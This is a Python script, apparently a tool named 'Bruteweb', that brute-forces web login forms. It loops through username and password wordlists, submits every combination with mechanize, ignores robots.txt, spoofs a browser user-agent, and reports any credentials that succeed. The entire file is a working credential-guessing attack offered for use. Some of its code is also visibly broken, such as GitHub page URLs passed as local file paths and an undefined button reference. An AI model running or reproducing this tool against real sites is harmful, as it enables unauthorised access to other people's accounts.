#!/usr/bin/env python3

import itertools
import time
import mechanize
import argparse
import threading
import signal
import sys
import os
import tkinter as tk
from tkinter import filedialog
from tkinter import ttk
import webbrowser
from urllib.parse import urlparse
from tkinter import messagebox

# Bruteweb
# by N4tzzSquad
# > https://github.com/N4tzz-Official
# V2.999

version = "9100"
window = None

class TextRedirector:
    def __init__(self, text_widget, tag="stdout"):
        self.text_widget = text_widget
        self.tag = tag
    def write(self, msg):
        self.text_widget.config(state=tk.NORMAL)
        self.text_widget.insert(tk.END, msg, (self.tag,))
        self.text_widget.see(tk.END)
        self.text_widget.config(state=tk.DISABLED)
    def flush(self):
        pass

def stop_brute_force():
    global stop_event
    stop_event.set()
    run_button.config(state=tk.NORMAL)

def signal_handler(sig, frame):
    global stop_event
    stop_event.set()
    print("Received Ctrl+C. Stopping...")

def validate_non_negative_float(value):
    f_value = float(value)
    if f_value < 0:
        raise argparse.ArgumentTypeError(f"{value} must be a non-negative float.")
    return f_value

def validate_positive_int(value):
    int_value = int(value)
    if int_value < 1:
        raise argparse.ArgumentTypeError(f"{value} must be a positive integer.")
    return int_value

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('url', type=str, nargs='?', default='', help="Login URL")
    parser.add_argument('username', type=str, nargs='?', default='https://github.com/N4tzz-Official/BruteForceWeb/blob/main/username.txt', help="Username URL")
    parser.add_argument('password', type=str, nargs='?', default='https://github.com/N4tzz-Official/BruteForceWeb/blob/main/password.txt', help="Password URL")
    parser.add_argument("error", type=str, nargs='?', default='', help="Error message")
    parser.add_argument("-t", dest='time', action='store', type=validate_non_negative_float, default=0, help="Time sleep m/s")
    parser.add_argument("-c", dest='header', action='store', type=str, default='Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101206 Ubuntu/10.10 (maverick) Firefox/3.6.13', help="Custom user-agent")
    parser.add_argument("-u", dest='usern', action='store', type=str, default='username', help="Form for username, default:username")
    parser.add_argument("-p", dest='passn', action='store', type=str, default='password', help="Form for password, default:password")
    parser.add_argument("-v", "--verbose", dest='verb', action='count', default=0, help="Verbosity (between 1-2-3 occurrences with more leading to more verbose logging).")
    return parser.parse_args()

# Logo/Banner
print('''
       __    __  __    __    __                          ______                                       __        _______                         __                ________                                       __       __            __       
/  \  /  |/  |  /  |  /  |                        /      \                                     /  |      /       \                       /  |              /        |                                     /  |  _  /  |          /  |      
$$  \ $$ |$$ |  $$ | _$$ |_   ________  ________ /$$$$$$  |  ______   __    __   ______    ____$$ |      $$$$$$$  |  ______   __    __  _$$ |_     ______  $$$$$$$$/______    ______    _______   ______  $$ | / \ $$ |  ______  $$ |____  
$$$  \$$ |$$ |__$$ |/ $$   | /        |/        |$$ \__$$/  /      \ /  |  /  | /      \  /    $$ |      $$ |__$$ | /      \ /  |  /  |/ $$   |   /      \ $$ |__  /      \  /      \  /       | /      \ $$ |/$  \$$ | /      \ $$      \ 
$$$$  $$ |$$    $$ |$$$$$$/  $$$$$$$$/ $$$$$$$$/ $$      \ /$$$$$$  |$$ |  $$ | $$$$$$  |/$$$$$$$ |      $$    $$< /$$$$$$  |$$ |  $$ |$$$$$$/   /$$$$$$  |$$    |/$$$$$$  |/$$$$$$  |/$$$$$$$/ /$$$$$$  |$$ /$$$  $$ |/$$$$$$  |$$$$$$$  |
$$ $$ $$ |$$$$$$$$ |  $$ | __$$ |__    $$ |__    $$$$$$  |$$ |  $$ |$$ |  $$ | /    $$ |$$ |  $$ |      $$$$$$$  |$$ |  $$ |  $$ | __$$ |__    $$ |__  $$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$ $$ $$ |$$ |  $$ |$$ |  $$ |
$$ |$$$$ |$$ |  $$ |  $$ |/  $$    |   $$    |   $$ |  $$ |$$ |  $$ |$$ |  $$ |/$$$$$$$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |  $$ |/  $$    |   $$    |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$ |$$$$ |$$ |  $$ |$$ |  $$ |
$$ | $$$ |$$ |  $$ |  $$  $$/$$$$$$/    $$$$$$/    $$$$$$/ $$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |  $$  $$/$$$$$$/    $$$$$$/$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |$$ | $$$ |$$ |  $$ |$$ |  $$ |
$$/   $$/ $$/   $$/    $$$$/$$ |_____ /$$ |_____  $$ |     $$/   $$/ $$/   $$/  $$$$$$$/ $$/   $$/       $$/   $$/ $$/   $$/    $$$$/$$ |_____ /$$ |_____ $$/   $$/ $$/   $$/ $$/   $$/ $$/   $$/ $$/   $$/ $$/ $$/   $$/ $$/   $$/ $$/   $$/ 
                        $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       $$       
''')

def brute_force(url, username_url, password_url, error_message, time_sleep, user_agent, username_field, password_field, verbosity):
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', user_agent)]
    
    with open(username_url) as user_file, open(password_url) as pass_file:
        usernames = user_file.read().splitlines()
        passwords = pass_file.read().splitlines()
    
    for username, password in itertools.product(usernames, passwords):
        if stop_event.is_set():
            break
        br.open(url)
        br.select_form(nr=0)
        br.form[username_field] = username
        br.form[password_field] = password
        response = br.submit()
        content = response.read()
        
        if error_message not in content.decode():
            print(f"Success: Username: {username} Password: {password}")
            break
        else:
            if verbosity > 0:
                print(f"Failed: Username: {username} Password: {password}")
        time.sleep(time_sleep)

def start_brute_force():
    args = parse_args()
    brute_force(args.url, args.username, args.password, args.error, args.time, args.header, args.usern, args.passn, args.verb)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    stop_event = threading.Event()
    start_brute_force()
